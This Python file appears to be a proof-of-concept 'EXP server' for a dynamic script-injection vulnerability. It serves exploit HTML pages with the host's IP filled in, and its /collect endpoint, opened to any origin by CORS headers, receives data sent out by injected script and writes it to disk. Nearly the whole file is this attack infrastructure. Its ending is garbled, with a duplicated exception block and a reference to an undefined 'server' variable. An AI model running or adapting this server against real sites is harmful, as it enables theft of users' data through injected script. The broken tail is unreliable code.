#!/usr/bin/env python3
"""
1.3 Dynamic Script Injection Risk - EXP Server
"""
import http.server, json, urllib.parse, os, socket

PORT = 8000
OUT_DIR = os.path.join(os.path.dirname(__file__), "received")
EXP_DIR = os.path.join(os.path.dirname(__file__), "exp")
os.makedirs(OUT_DIR, exist_ok=True)

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

LOCAL_IP = get_ip()

class H(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        p = urllib.parse.urlparse(self.path)
        
        if p.path == "/collect":
            q = urllib.parse.parse_qs(p.query)
            d = q.get("d", [""])[0]
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            if d:
                ts = str(int(__import__('time').time() * 1000))
                fp = os.path.join(OUT_DIR, f"collected_{ts}.txt")
                with open(fp, "w", encoding="utf-8") as f:
                    f.write(urllib.parse.unquote(d))
                print(f"[+] collected: {d[:100]}")
            self.wfile.write(b"ok")
            return

        if p.path.startswith("/exp/"):
            fn = os.path.basename(p.path) or "1.3.html"
            if not fn.endswith(".html"):
                fn += ".html"
            fp = os.path.join(EXP_DIR, fn)
            if os.path.exists(fp):
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                with open(fp, "r", encoding="utf-8") as f:
                    content = f.read()
                content = content.replace("{{LOCAL_IP}}", LOCAL_IP)
                self.wfile.write(content.encode("utf-8"))
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"exp not found")
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(f"""<html><body>
<h2>1.3 EXP Server</h2>
<p>IP: {LOCAL_IP}</p>
<p>Exp: <a href="/exp/1.3">/exp/1.3</a></p>
</body></html>""".encode("utf-8"))

    def do_POST(self):
        cl = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(cl) if cl > 0 else b""
        if self.path == "/collect":
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            ts = str(int(__import__('time').time() * 1000))
            fp = os.path.join(OUT_DIR, f"collected_{ts}.txt")
            with open(fp, "wb") as f:
                f.write(body)
            print(f"[+] POST: {body[:100]}")
            self.wfile.write(b"ok")
            return
        self.send_error(405)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.end_headers()

    def log_message(self, fmt, *args):
        print(f"[{self.client_address[0]}] {fmt % args}")

if __name__ == "__main__":
    print(f"[*] 1.3 EXP Server on :{PORT}")
    print(f"[*] IP: {LOCAL_IP}")
    print(f"[*] Exp: http://{LOCAL_IP}:{PORT}/exp/1.3")
    s = http.server.HTTPServer(("0.0.0.0", PORT), H)
    try:
        s.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Done")
        s.shutdown()
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 服务器已停止")
        server.shutdown()
